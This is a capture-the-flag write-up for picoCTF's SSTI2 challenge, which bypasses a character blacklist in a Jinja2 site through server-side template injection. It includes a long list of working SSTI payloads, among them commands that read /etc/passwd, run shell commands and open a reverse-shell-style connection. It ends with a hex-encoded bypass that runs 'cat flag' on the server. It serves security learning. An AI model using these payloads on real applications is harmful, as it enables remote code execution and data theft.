# SSTI2

AUTHOR: VENAX

Description

I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)

Additional details will be available after launching your challenge instance.

Hints:

1. Server Side Template Injection
2. Why is blacklisting characters a bad idea to sanitize input?

This challenge is the continuation of SSTI1, based on the title we could already know it is related to Server Side Template Injection attack. However, this challenge mentioned it has blocked certain characters.

![1000170803](https://github.com/user-attachments/assets/718192db-09ba-4b1c-b002-11bc159ea19e)

We could not identified filtering used based on the website source code:

```java
<!doctype html>
      <title>SSTI2</title>
<h1> Home </h1>
<p> I built a cool website that lets you announce whatever you want!* </p><form action="/" method="POST"> 
What do you want to announce: <input name="content" id="announce"> <button type="submit"> Ok </button>
      </form>
      <p style="font
size:10px;position:fixed;bottom:10px;left:10px;"> *Announcements may only reach yourself </p>
```

We already know the website is using Jinja2 as template engine based on challenge SSTI1.

{{7*’7’}} returns 7777777 → Jinja2

We will brute force to identify the correct payload based on Jinja2:

```jsx
{{4*4}}
{{7*7}}
{{7*'7'}}
{{dump(app)}}
{{app.request.server.all|join(',')}}
{{config.items()}}
{{ [].class.base.subclasses() }}
{{''.class.mro()[1].subclasses()}}
{{ ''.__class__.__mro__[2].__subclasses__() }}
{% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}
{{ request }}
{{self}}
{{app.request.query.filter(0,0,1024,{'options':'system'})}}
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
{{['id']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
{{request|attr(["_"*2,"class","_"*2]|join)}}
{{request|attr(["__","class","__"]|join)}}
{{request|attr("__class__")}}
{{request.__class__}}
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
{{self._TemplateReference__context.cycler.__init__.__globals__.os}}
{{self._TemplateReference__context.joiner.__init__.__globals__.os}}
{{self._TemplateReference__context.namespace.__init__.__globals__.os}}
{{cycler.__init__.__globals__.os}}
{{joiner.__init__.__globals__.os}}
{{namespace.__init__.__globals__.os}}
```

We successfully identified the correct payload that successfully executed on the server:

![image](https://github.com/user-attachments/assets/706a2f6f-844d-4298-8ba8-fe5d4c8a4d4d)


This is the full payload:

{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}

All we need to do know is to change the id to cat flag:

{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}

What the code does?

- \x5f is the hex encoding of _ (underscore)

The payload first sends the request and gives access to Flask application interface. It allow us to gain access to global variables. Next, it access global and builtins that allow access to builtin python functions such as import and open. import os helps load the os module that allows file manipulation and file access. os.popen(’cat flag’) will get the flag and read() will get output of the command and displays it. 

And we get the flag:

**picoCTF{sst1_f1lt3r_byp4ss_8b534b82}**
